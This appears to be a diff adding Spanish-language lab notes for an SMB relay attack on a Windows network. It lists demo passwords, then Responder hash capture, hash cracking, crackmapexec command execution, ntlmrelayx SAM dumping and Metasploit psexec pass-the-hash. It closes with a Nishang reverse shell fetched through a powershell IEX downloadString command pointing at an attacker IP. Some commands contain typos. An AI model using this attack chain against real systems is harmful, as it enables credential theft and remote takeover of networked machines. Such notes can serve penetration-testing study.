@@ -1,0 +1,101 @@
+Demo:
+Credenciales
+
+Administrator Password: Darth_Vader
+lbaez Password: Password123
+mravelo Password: Password123
+
+
+SMBrelay
+
+responder command:
+
+* responde -I eth0 -rdw (Captura conexiones SMB en el dominio de red)
+
+Cracking Offline de Hashs (Hashcat o John):
+
+* john --wordlist=/.../.../.../ hashs
+* hashcat -m 5600 -a 3 hashs 
+
+Crackmapexec command:
+
+* crackmapexec smb 192.168.11.0/24 (enumeracion de equipos potenciales para conexiones amb)
+
+* crackmapexec smb 192.168.11.0/24 -u "user" -p "pass" (Validar sobre que equipos tienen privilegio un par de credenciales)
+
+* crackmapexec smb 192.168.11.129  -u user -p 'pass' -x whoami (Con credenciales validas deberia ser posible ejecutar comandos en un equipo victima)
+
+SMBrelay 2
+
+1. Editar la configuracion de responder ubicada en el archivo /usr/share/responder/Responder.conf (apagar los servicios o protocolos "smb" "http")
+
+2. nuevamente:
+
+* responde -I eth0 -rdw (Captura conexiones SMB en el dominio de red)
+
+3. lo siguiente es crear un archivo de targets donde agregaremos las IP de los equipos sobre los cuales deseamos establecer una conexion smb usando un hash ntlmv2
+
+Ntlmrelayx  command:
+
+*ntlmrelayx  -tf "archivo con la ip del target" -smb2support 
+
+4. el resuldato deberia ser un dumpeo de la SAM donde se almacenan los hashes de usarios utiles para realizar pass the hash
+
+5. en el SAM se almacenan las credenciales de los usuarios almacenadas en el equipo vicitima, podemos aprovechar dichas credenciales para hacer Pass the Hash, para evitar complejidades usaremos Metasploit 
+
+Metasploit command:
+
+*msfdb run (Iniciar las consola Metasploit)
+*search psexec (Para buscar el exploit psexec con capacidades de Pass the Hash)
+*use exploit/windows/smb/psexec (Para seleccionar el exploit exploit/windows/smb/psexec)
+*show options (Para mostrar las opciones necesarias para ejecutar el exploit)
+ set RHOSTS = "Para colocar la ip de la victima o victimas" | set SMBuser "Para colocar el usuario con el que nos queremos conectar esencialmente el usuario Administrator"
+ set SMBPass = "Colocar el hash ntlm del usuario o en su defecto la contrase?a en texto plano previamente crakeada"
+ set SMBDomain = "un (.) que es la opcion por defecto, en caso de que el usuario pertenezca a un dominio colocar el dominio)
+
+6. (Opcional)
+
+Un modo mas evasio aunque complicado de ejecutar comando arbitrarios en un equipo victima:
+
+
+*Instalar nishan del respositorio de github que contiene shells utiles para explotacion
+
+*usar la shell Invoke-PowerShellTCP.ps1 y podemos copiar a nuestro directorio de trabajo  renombrar a un nombre mas corto como PS.ps1
+
+*agregamos la linea "Invoke-PowerShellTCP -Reverse -IPAdress 192.168.254.226 -Port 4444" al flujo de ejecucion del Script colocandola al final del archivo.
+
+cambiamos la ip por nuestra ip de atacante y el puerto deseado.
+
+posterior a esto ubicados en el directorio donde esta el File PS.ps1 compartimos usando python el file 
+
+
+Python command:
+
+* Python3 -m http.server o Python -m SimpleHTTPServer
+
+Netcat command
+
+7. nos ponemos en escucha a traves del puerto seleccionado
+
+* rlwrap nc -nlvp 4444
+
+Ntlmrelayx  command:
+
+8. luego utilizando la herramienta Ntlmrelayx descargamos el file PS.ps1 tras utilizar la conexiones smb con Hash Ntlmv2 capturadas por el responder y reenviadas a Ntlmrelayx  con el siguiente comando:
+
+* ntlmrelayx  -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebCliente).downloadString('http://attack ip:8000/PS.ps1 )"
+
+
+
+Y LISTO :) 
+
+
+By Maicker Ravelo (dstark)
+
+
+
+
+
+
+
+
